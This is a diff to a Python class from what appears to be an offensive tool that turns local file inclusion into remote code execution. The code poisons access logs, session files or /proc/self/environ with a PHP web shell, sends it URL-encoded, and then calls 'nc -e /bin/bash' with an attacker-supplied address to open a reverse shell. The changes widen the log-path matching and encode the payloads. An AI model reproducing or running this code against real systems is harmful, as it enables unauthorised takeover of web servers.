@@ -34,7 +34,8 @@ class Shell_conncet:
             output   = str(DisCover.communicate()).split()
             self.ip_re = (output[2]).replace("(",'').replace(')','')
         if "proc/self/environ" in self.url\
-        or 'apache2/access.log' in self.url or 'sessions' in self.url :                                                                                                          
+        or 'access.log' in self.url or "access" in self.url\
+        or 'sessions' in self.url :                                                                                                          
             self.paylaodPHP = "<?php system($_GET['cmd']); ?>"  
             request = mechanize.Browser()
             request.set_handle_robots(False)
@@ -71,8 +72,9 @@ class Shell_conncet:
                 except KeyboardInterrupt:
                      exit()
             if 'sessions' in self.url :
-                self.Cookie += "<?php system($_GET['cmd']); ?>"
-                equest.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                WebShell = "%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"
+                WEB = self.args.Vulnurl+WebShell
+                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                      Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                      ('username',f'{self.args.user}'),
                                      ('password',f'{self.args.password}'),
@@ -82,11 +84,11 @@ class Shell_conncet:
                 run    = 'gnome-terminal  -- '+path
                 xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
                 if not self.args.port:
-                    command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
+                    command = self.url+f'&cmd=nc%20-e%20%2Fbin%2Fbash%20{self.args.shell}%207777'  
                 else:
                      command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
                 try:
-                    first_req = request.open(self.url).read()  
+                    first_req = request.open(WEB).read()  
                     time.sleep(4) 
                     self.Get_Oregnal_URL = request.open(command).read()
                     exit()
@@ -130,7 +132,7 @@ class Shell_conncet:
                 time.sleep(1)
                 first_req = request.open(self.url).read()
                 exit()
-        elif  "auth" in  self.url or "auth.log" in  self.url :                  
+        elif  "auth" in  self.url or "auth.log" in  self.url :                 
                 if os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','r') as readHost:
                                       Host = readHost.read()
